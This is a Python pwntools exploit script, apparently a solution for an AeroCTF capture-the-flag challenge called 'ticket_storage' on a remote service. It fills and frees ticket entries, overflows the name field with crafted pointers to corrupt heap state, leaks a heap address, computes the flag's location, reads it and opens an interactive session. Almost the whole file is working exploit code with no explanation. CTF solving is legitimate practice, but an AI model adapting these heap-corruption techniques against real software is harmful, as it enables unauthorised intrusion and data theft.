from pwn import *
#io=process("./ticket_storage",env={"LD_PRELOAD":"./libc.so.6"})

io=remote("tasks.aeroctf.com",33014)

io.sendlineafter("{?} Enter name: ","1"*0x80)

def reserve(dept,dest,cost):
    io.sendlineafter("> ","1")
    io.sendlineafter("{?} Enter departure city: ",dept)
    io.sendlineafter("{?} Enter destination city: ",dest)
    io.sendlineafter("{?} Enter the desired cost: ",str(cost))
    io.recvuntil("{+} Your ticket id: ")
    ticket_id=io.recvline()
    return ticket_id[:-1]


def view(ticket_id):
    io.sendlineafter("> ","2")
    io.sendlineafter("{?} Enter ticket id: ",ticket_id)

def view_list():
    io.sendlineafter("> ","3")

def delete(ticket_id):
    io.sendlineafter("> ","4")
    io.sendlineafter("{?} Enter ticket id: ",ticket_id)

def change_name(name):
    io.sendlineafter("> ","5")
    io.sendlineafter("{?} Enter name: ",name)
ids=[]
for i in range(8):
    ids.append(reserve("bbb","ccc",10))

#print ids
delete(ids[-2])
delete(ids[-1])

payload = p64(0x4041b0)*2+p64(0xaa)+p64(0x4041b0)+"a"*16
#print hex(len(payload))
change_name(payload)
#io.recvuntil("Cost: 10")
#io.recvuntil("Cost: 10")
#io.recvuntil("Owner: 11111111111111111111111111111111")
new_id=reserve("bbb","ccc",10)
view("aaaaaaaaa")
io.recvuntil("From: ")
heap=u64((io.recvline()[:-1]).ljust(8,"\x00"))
print hex(heap)
delete(ids[-4])
delete(ids[-3])
flag=heap-0xa10+0x90
payload = p64(flag)*2+p64(0xaa)+p64(0x4041b0)+"b"*16
change_name(payload)
new_id=reserve("bbb","ccc",10)
view("bbbbbbbbb")
#gdb.attach(io)
#heap=io.recv(8)

#print hex(u64(heap))


io.interactive()
